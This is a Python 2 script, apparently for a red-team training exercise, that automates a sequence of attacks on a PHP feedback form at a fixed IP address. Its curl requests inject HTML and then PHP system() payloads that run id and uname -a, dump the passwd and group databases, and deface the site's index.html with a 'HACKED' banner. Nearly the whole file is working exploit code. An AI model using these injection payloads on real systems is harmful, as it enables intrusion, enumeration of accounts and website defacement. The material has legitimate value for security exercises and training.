from subprocess import call
import socket
import sys

# We need to check if we are in the test environment before launching any attacks

print "checking if you are in the practise environment"
try:
    test = socket.gethostbyname('www.datacentre.fi')
except:
    print "failed to resolve, you might not be in the practise environment"
    print "exiting"
    sys.exit()
if test != "37.47.255.10":
    print "www.datacentre.fi didn't resolve to the right address, you might not"
    print "be in the test environment"
    sys.exit()
    
print "success!"

welcome = """
Welcome to cyber exercise red team automation tool
You can launch attacks in predetermined order by
typing yes and pressing Enter. You'll be given a
brief summary of each attack before the option to launch.
To exit out of the program type exit and press Enter.

You need to be monitoring the site palaute.php to
see the outcome of these attacks. Refresh the site
by pressing F5 after each attack.
"""
print(welcome)

attack1 = """
The next attack will test the site for code injection vulnerability
the text \"testing\" will appear on the site.
"""
print(attack1)

command = raw_input("type yes and press Enter to launch\n>")
while command != "yes":
    if command == "exit":
        exit()
    command = raw_input("type yes and press Enter to launch\n>")

call(["curl", "-k", "https://89.250.48.10//tallenna.php?merkinta=<h3>testing</h3>&nappi=Tallenna"])
print("executed")

attack2 = """
The next attack will give you information about the privileges
you have on the target system
"""
print(attack2)

command = raw_input("type yes and press Enter to launch\n>")
while command != "yes":
    if command == "exit":
        exit()
    command = raw_input("type yes and press Enter to launch\n>")

call(["curl", "-k", "https://89.250.48.10/tallenna.php?merkinta=<?php+echo+system(\"id\");+?>&nappi=Tallenna"])
print("executed")


attack3 = """
This attack prints targer system kernel version, arch
and distro.
"""
print(attack3)

command = raw_input("type yes and press Enter to launch\n>")
while command != "yes":
    if command == "exit":
        exit()
    command = raw_input("type yes and press Enter to launch\n>")

call(["curl", "-k", "https://89.250.48.10/tallenna.php?merkinta=<?php+echo+system(\"uname+-a\");+?>&nappi=Tallenna"])
print("executed")

attack4 = """
This attack dumps passwd and group databases.
"""
print(attack4)

command = raw_input("type yes and press Enter to launch\n>")
while command != "yes":
    if command == "exit":
        exit()
    command = raw_input("type yes and press Enter to launch\n>")

call(["curl", "-k", "https://89.250.48.10/tallenna.php?merkinta=<?php+echo+system(\"getent+passwd\");+?>&nappi=Tallenna"])
print("executed")

attack5 = """
This next attack will deface the company website.
It won't be visible until you reaload (F5) the
palaute.php site. Multiple reloads prepend the
HACKED text multiple times to company index page.
"""
print(attack5)

command = raw_input("type yes and press Enter to launch\n>")
while command != "yes":
    if command == "exit":
        exit()
    command = raw_input("type yes and press Enter to launch\n>")

call(["curl", "-k", "https://89.250.48.10/tallenna.php?merkinta=<?php+echo+system(\"echo+\\\"<h1+style=color:red>HACKED</h1>\\n$(cat+index.html)\\\"+>+index.html\");+?>&nappi=Tallenna"])
print("executed")
